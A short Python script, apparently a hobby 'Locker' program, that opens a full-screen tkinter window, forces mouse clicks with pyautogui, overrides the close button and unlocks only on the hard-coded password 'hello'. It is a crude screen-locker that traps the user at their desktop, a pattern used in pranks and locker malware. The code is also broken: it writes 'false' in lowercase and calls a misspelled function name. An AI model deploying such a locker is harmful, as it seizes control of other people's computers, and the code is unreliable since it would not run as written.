from tkinter import Tk,Entry,Label
from pyautogui import click, moveTo
from time import sleep
def callback(event):
	global k,entry
	if entry.get()=="hello": k=True
def on_clossing():
	click(675, 420)
	moveTo(675, 420)
	root.attributes("-fullscreen",True)
	root.protocol("WM_DELETE_WINDOW", on_clossing)
	root.update()
	root.bind('<Control-KeyPress-c>', callback)
root=Tk() # создание окна
root.title("Locker") # имя заголовка
root.attributes("-fullscreen",True)# расширение под экран
entry=Entry(root,font=1) # поле ввода
entry.place(width=150,height=50,x=600,y=400) # размещение поля по координатам и размерам
label0=Label(root,text="Locker_by_#571",font=1)
label0.grid(row=0,column=0)
label1=Label(root,text="Write the Password and Press Ctrl+C",font='Arial 20')
label1.place(x=470,y=300)
root.update(); sleep(0.2); click(675,420) # обновление экрана программы
k=false
while k!=True: on_closing()
